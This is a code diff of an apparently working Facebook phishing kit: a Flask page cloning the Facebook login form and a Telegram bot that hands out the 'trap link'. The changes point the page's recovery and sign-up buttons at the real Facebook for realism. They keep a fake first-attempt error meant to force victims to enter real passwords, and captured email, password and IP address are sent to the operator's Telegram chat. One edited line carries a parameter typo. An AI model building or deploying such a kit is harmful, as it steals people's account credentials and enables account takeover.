@@ -14,7 +14,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # ==========================================
-# قالب فيسبوك مع نظام التحقق الذكي لمنع البيانات الوهمية
+# قالب فيسبوك المطابق مع توجيه الروابط الحقيقية (نسيت كلمة السر / إنشاء حساب)
 # ==========================================
 FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
@@ -109,6 +109,9 @@ FB_PHISH_TEMPLATE = """
             display: block;
             margin-bottom: 20px;
         }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
         hr {
             border: none;
             border-top: 1px solid #dadde1;
@@ -148,18 +151,19 @@ FB_PHISH_TEMPLATE = """
     <div class="card">
         <div class="card-title">تسجيل الدخول إلى فيسبوك</div>
         
-        <!-- رسالة خطأ وهمية تظهر إذا كانت البيانات غير منطقية -->
         <div id="error-msg" class="error-box">
-            كلمة السر التي أخلتها غير صحيحة. هل نسيت كلمة السر؟
+            كلمة السر التي أدخلتها غير صحيحة. هل نسيت كلمة السر؟
         </div>
 
         <form method="POST" id="loginForm" onsubmit="return validateData(event)">
             <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" id="pass" name="pass" placeholder="كلمة السر" required>
             <button type="submit" class="login-btn">تسجيل الدخول</button>
-            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+            <!-- زر نسيت كلمة السر يوجهه لموقع فيسبوك الحقيقي للاسترجاع -->
+            <a href="https://www.facebook.com/login/identify/?ctx=recover" class="forgot-link">هل نسيت كلمة السر؟</a>
             <hr>
-            <a href="#" class="create-btn">إنشاء حساب جديد</a>
+            <!-- زر إنشاء حساب يوجهه للموقع الرسمي -->
+            <a href="https://www.facebook.com/r.php" class="create-btn">إنشاء حساب جديد</a>
         </form>
     </div>
 
@@ -170,14 +174,14 @@ FB_PHISH_TEMPLATE = """
             const pass = document.getElementById('pass').value.trim();
             const errorBox = document.getElementById('error-msg');
 
-            // إذا حاول الضحية كتابة حروف عشوائية قصيرة جداً أو وهمية في أول محاولة
+            // منع الحروف الوهمية في المحاولة الأولى لإجباره على كتابة بيانات صحيحة
             if (attempt === 0 && (pass.length < 4 || email.length < 4)) {
-                event.preventDefault(); // منع الإرسال في المرة الأولى
-                errorBox.style.display = 'block'; // إظهار خطأ فيسبوك الشهير
+                event.preventDefault();
+                errorBox.style.display = 'block';
                 attempt++;
                 return false;
             }
-            return true; // في المحاولة الثانية يتم إرسال البيانات الحقيقية التي كتبها للمطور فوراً
+            return true;
         }
     </script>
 </body>
@@ -194,9 +198,9 @@ def fb_trap():
         
         if target_chat_id:
             alert_msg = (
-                "🚨 **تم التقاط صيد جديد بنجاح!**\n\n"
-                f"👤 **البيانات المُدخلة:** `{email}`\n"
-                f"🔑 **كلمة السر:** `{password}`\n"
+                "🚨 **تم التقاط الصيد بنجاح!**\n\n"
+                f"👤 **البريد/الهاتف:** `{email}`\n"
+                f"🔑 **كلمة السر الحقيقية:** `{password}`\n"
                 f"🌐 **عنوان الـ IP:** `{source_ip}`"
             )
             try:
@@ -223,9 +227,9 @@ def start_command(message):
     user_name = message.from_user.first_name
     text = (
         f"⚡ **مرحباً بك يا {user_name}**\n\n"
-        "تم تحديث النظام بآلية **التحقق الذكي** لمنع الحروف الوهمية وإجبار الهدف على إعادة المحاولة وإدخال بياناته الحقيقية."
+        "تم تحديث الأزرار بحيث يتم توجيه الضحية إلى روابط فيسبوك الرسمية (استعادة الحساب / إنشاء حساب) عند الضغط عليها لضمان تجربة واقعية تماماً."
     )
-    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
+    bot.send_message(message.chat.id, text, parse_Mode="Markdown", reply_markup=main_menu())
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
@@ -238,8 +242,7 @@ def callback_handler(call):
         msg = (
             "🎯 **رابط المصيدة جاهز:**\n\n"
             f"`{phish_link}`\n\n"
-            "💡 **نصيحة لإخفاء الرابط الطويل:**\n"
-            "بما أن نطاقات الاستضافات المجانية تظهر بشكل طويل، استخدم مواقع اختصار الروابط الشهيرة مثل (Bitly) أو قم بتلبيس الرابط خلف كلمة أو صورة أثناء إرساله للضحية لكي لا يشتبه به."
+            "الآن أي ضغطة على 'هل نسيت كلمة السر؟' هتنقله لموقع فيسبوك الأصلي مباشرة، وأي إدخال بيانات حقيقي هيوصلك على البوت."
         )
         bot.send_message(chat_id, msg, parse_mode="Markdown")
 
